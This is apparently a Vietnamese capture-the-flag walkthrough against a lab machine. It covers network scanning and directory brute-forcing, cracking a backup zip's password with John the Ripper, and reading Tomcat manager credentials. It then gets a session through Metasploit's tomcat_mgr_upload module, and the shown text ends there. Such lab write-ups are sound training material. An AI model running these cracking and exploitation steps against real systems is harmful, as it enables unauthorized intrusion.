# Tool

## Network Scanning
- discover
- nmap

## Enumeration
- dirb
- fcrackzip

## Exploitation
- metasploit
- john

## Privilege Escalation
- ssh
- python library hijacking
- root flag

## Level: Medium

# Network Scanning
Để bắt đầu, chúng ta phải sử dụng lệnh `netdiscover` để quét mạng để tìm địa chỉ IP của máy mục tiêu.
    
    netdiscover

![image](https://github.com/user-attachments/assets/2a9999d5-78ab-4868-805e-8a2a58c40414)

` Mục tiêu: 192.168.176.103`

Tiếp theo sử dụng công cụ `nmap` để quét mục tiêu để khám phá các dịch vụ, phiên phản dịch vụ và hệ điều hành được sử dụng trên mục tiêu.

    sudo nmap -sC -sV -O  192.168.176.103
( tùy chọn -sC: chạy các script mặc định của Nmap để thu thập thêm thông tin về các dịch vụ đang chạy trên máy mục tiêu, -sV: phát hiện phiên bản của các dịch vụ đang chạy trên các cổng mở,
-O: phát hiện hệ điều hành (OS fingerprinting) của máy mục tiêu).

![image](https://github.com/user-attachments/assets/388f9cbb-df53-462e-bbc1-963bc18675e1)

Theo kết quả hiện có 3 cổng đang được mở:
- Cổng 22 dịch vụ SSH.
- Cổng 80 dịch vụ HTTP ( Apache/2.4.41).
- Trên cổng 8080, Apache Tomcat 9.0.53 đang chạy.

# Enumeration

Khám phá trang máy chủ Apache `192.168.176.103:80`

Sử dụng công cụ `dirb` để liệt kê các liên kết, thư mục của trang web

    dirb http://192.168.176.103:80  

![image](https://github.com/user-attachments/assets/1a2a7979-1fe3-4ec4-a290-06acbdd4fc03)

Truy cập liên kết tìm thấy, không có gì lạ, nó chỉ là một trang máy chủ Apache.

![image](https://github.com/user-attachments/assets/2bfb8ec2-2de3-4efb-8a6c-4f9a4149b290)

Nâng cấp hơn vẫn sử dụng `brute foces` với công cụ `dirb` nhưng thêm các các extensions để mong tìm được thông tin hữu ích hơn:


    dirb http://192.168.176.103:80  -X .zip,.php,txt

![image](https://github.com/user-attachments/assets/56f55315-f929-4455-a859-7fea1ede72b4)

Không có thông tin gì thêm cả.

Thử mục tiêu tiếp theo Apache Tomcat. Các câu lệnh:

     dirb http://192.168.176.103:8080
     dirb http://192.168.176.103:8080 -X .zip,.txt,.php

![image](https://github.com/user-attachments/assets/91e85a94-b3ab-4ecc-8a21-1d9b7591c8a4)

![image](https://github.com/user-attachments/assets/0808ece1-d3f2-456f-ac3b-a0f0dff9ecb9)

Khá may mắn, đã tìm được liên kết có vẻ hữu ích: `http://192.168.176.103:8080/backup.zip`

Tải về và giải nén nó xem có thông tin gì không?

![image](https://github.com/user-attachments/assets/241763e2-6fa2-4372-8c4f-a838b38fb866)

File yêu cầu password, tiến hành bẻ khóa file zip này.

    zip2john backup.zip > zip_hash.txt         
    john -w=/usr/share/wordlists/rockyou.txt zip_hash.txt

![image](https://github.com/user-attachments/assets/98658c34-adb2-4e85-980c-ddcd765bc2db)

`password: @administrator_hi5 `

Hoặc đơn giản hơn chúng ta có thể sử dụng công cụ fcrackzip:

![image](https://github.com/user-attachments/assets/09afe1ae-d820-4e2e-8ba3-cdda69d6e64a)

Giải nén tệp tin với mật khẩu đã tìm được:

![image](https://github.com/user-attachments/assets/962c61fb-b380-461a-8b3f-c85c45e66596)

Chú ý đến tệp liên quan đến `user` tôi mở chúng.

    cat tomcat-users.xml 

![image](https://github.com/user-attachments/assets/a2af702f-b4ec-4b10-8c2d-4c60dedeb116)

# Exploitation

Vì trước đó tìm được thông tin xác thực hợp lệ (username và password) cho trang quản lý của Tomcat `admin/melehifokivai` nên ta tiến hành exploit sử dụng metasploit module exploit/multi/http/tomcat_mgr_upload:

    use exploit/multi/http/tomcat_mgr_upload
    set RHOSTS 192.168.176.103
    set RPORT 8080
    set HttpUsername admin
    set HttpPassword melehifokivai

![image](https://github.com/user-attachments/assets/371ad4ad-933c-4f50-91e1-a373c8c6af01)

Khai thác thành công. Tạo được session tới mục tiêu:



    






